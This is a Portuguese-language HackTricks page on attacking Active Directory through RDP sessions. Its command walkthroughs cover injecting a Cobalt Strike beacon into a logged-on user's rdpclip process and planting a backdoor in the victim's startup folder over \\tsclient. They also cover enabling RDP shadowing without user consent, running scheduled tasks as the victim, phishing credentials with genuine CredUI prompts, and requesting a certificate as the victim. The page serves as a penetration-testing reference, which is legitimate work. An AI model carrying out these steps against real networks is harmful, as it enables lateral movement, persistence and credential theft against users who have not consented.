# Abuso de Sessões RDP

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Se o **grupo externo** tiver **acesso RDP** a qualquer **computador** no domínio atual, um **atacante** poderá **comprometer esse computador e esperar por ele**.

Depois que esse usuário acessar via RDP, o **atacante poderá fazer pivot para a sessão desse usuário** e abusar de suas permissões no domínio externo.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Confira **outras formas de roubar sessões com outras ferramentas** [**nesta página.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Se um usuário acessar uma máquina via **RDP** onde um **atacante** estiver **aguardando** por ele, o atacante poderá **injetar um beacon na sessão RDP do usuário** e, se a **vítima tiver montado sua unidade** ao acessar via RDP, o **atacante poderá acessá-la**.

Nesse caso, você poderia simplesmente **comprometer** o **computador original da vítima** gravando um **backdoor** na **startup folder**.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

Se você for **administrador local** em um host onde a vítima já tenha uma **sessão RDP ativa**, poderá conseguir **visualizar/controlar esse desktop sem roubar a senha ou fazer dump do LSASS**.<sup>[[1]](#references)</sup>

Isso depende da policy de **shadowing do Remote Desktop Services**, armazenada em:<sup>[[2]](#references)[[3]](#references)</sup>
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
Valores interessantes:

- `0`: Desabilitado
- `1`: `EnableInputNotify` (controle, aprovação do usuário necessária)
- `2`: `EnableInputNoNotify` (controle, **sem aprovação do usuário**)
- `3`: `EnableNoInputNotify` (somente visualização, aprovação do usuário necessária)
- `4`: `EnableNoInputNoNotify` (somente visualização, **sem aprovação do usuário**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
Isso é especialmente útil quando um usuário privilegiado conectado via RDP deixou uma área de trabalho desbloqueada, uma sessão do KeePass, um console MMC, uma sessão do navegador ou um shell de admin aberto.

## Scheduled Tasks As Logged-On User

Se você for **local admin** e o usuário-alvo estiver **atualmente conectado**, o Task Scheduler poderá iniciar código **como esse usuário sem a senha dele**.<sup>[[1]](#references)[[4]](#references)</sup>

Isso transforma a sessão de logon existente da vítima em uma primitiva de execução:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
Notas:

- Se o usuário **não estiver conectado**, o Windows normalmente exige a senha para criar uma task que seja executada como ele.
- Se o usuário **estiver conectado**, a task pode reutilizar o contexto de logon existente.
- Essa é uma forma prática de executar ações de GUI ou iniciar binários dentro da sessão da vítima sem tocar no LSASS.

## Abuso de prompts do CredUI na sessão da vítima

Quando você puder executar código **dentro do desktop interativo da vítima** (por exemplo, via **Shadow RDP** ou uma **scheduled task executada como esse usuário**), poderá exibir um **prompt real de credenciais do Windows** usando as APIs do CredUI e coletar as credenciais inseridas pela vítima.<sup>[[1]](#references)</sup>

APIs relevantes:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Fluxo típico:

1. Inicie um binário na sessão da vítima.
2. Exiba um prompt de autenticação de domínio que corresponda à identidade visual do domínio atual.
3. Extraia o buffer de autenticação retornado.
4. Valide as credenciais fornecidas e, opcionalmente, continue exibindo prompts até que credenciais válidas sejam inseridas.

Isso é útil para **phishing on-host**, pois o prompt é renderizado pelas APIs padrão do Windows em vez de um formulário HTML falso.

## Solicitando um PFX no contexto da vítima

A mesma primitiva de **scheduled-task-as-user** pode ser usada para solicitar um **certificado/PFX como a vítima conectada**. Esse certificado poderá ser usado posteriormente para **autenticação AD** como esse usuário, evitando completamente o roubo de senhas.<sup>[[1]](#references)[[5]](#references)</sup>

Fluxo de alto nível:

1. Obtenha **local admin** em um host no qual a vítima esteja conectada.
2. Execute a lógica de enrollment/export como a vítima usando uma **scheduled task**.
3. Exporte o **PFX** resultante.
4. Use o PFX para autenticação AD baseada em PKINIT / certificado.

Consulte as páginas de AD CS para abusos posteriores:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## Referências

- [1] [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [3] [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
